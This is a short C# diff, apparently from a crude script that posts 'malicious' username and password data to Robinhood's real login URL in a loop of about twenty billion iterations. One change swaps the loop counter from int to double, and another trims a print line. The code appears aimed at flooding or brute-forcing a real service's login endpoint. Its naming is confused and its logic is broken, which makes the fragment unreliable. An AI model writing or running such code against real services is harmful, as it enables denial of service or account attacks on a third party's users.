@@ -32,7 +32,7 @@ namespace tester
             // print each line of the data nicely
             foreach (var line in response.Content.ReadAsStringAsync().Result.Split(new[] { Environment.NewLine }, StringSplitOptions.None))
             {
-                Console.WriteLine($"Line {0+line} {line}");
+                Console.WriteLine($"{line}");
             }
             // Return the data
             return 0;
@@ -63,7 +63,7 @@ namespace tester
         // Create malicious data for POST
         var data = "username=malicious&password=malicious";
         decompile("https://www.robinhood.com/login", data);
-        for (int i = 0; i < 20040905745; i++)
+        for (double i = 0; i < 20040905745; i++)
         {
             // Call the post function to post the data to the API
             helloWorld.tester.test();
